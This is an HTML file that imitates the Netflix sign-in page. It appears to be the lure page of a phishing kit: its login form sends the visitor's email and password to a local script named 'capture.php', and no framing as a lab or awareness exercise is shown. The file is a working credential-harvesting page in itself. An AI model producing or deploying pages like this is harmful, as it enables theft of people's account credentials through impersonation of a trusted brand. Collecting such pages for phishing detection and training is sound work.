<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Login</title>
    <link rel="stylesheet" href="./style.css">
</head>
<body>
    <div class="overlay">
        <div class="login-container">
            <h1>Sign In</h1>
            
            <form action="./capture.php" method="POST">
                <div class="form-group">
                    <label for="email">Email or mobile number</label>
                    <input type="email" id="email" placeholder="Enter your email or mobile number" name="email" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" placeholder="Enter your password" name="password" required>
                </div>
                <button type="submit" class="btn">Sign In</button>
            </form>

            <div class="extra-links">
                <div class="remember-me">
                    <input type="checkbox" id="remember">
                    <label for="remember">Remember me</label>
                </div>
                <div>
                    <a href="#">Forgot password?</a>
                </div>
                <div>
                    <a href="#">New to Netflix? Sign up now.</a>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
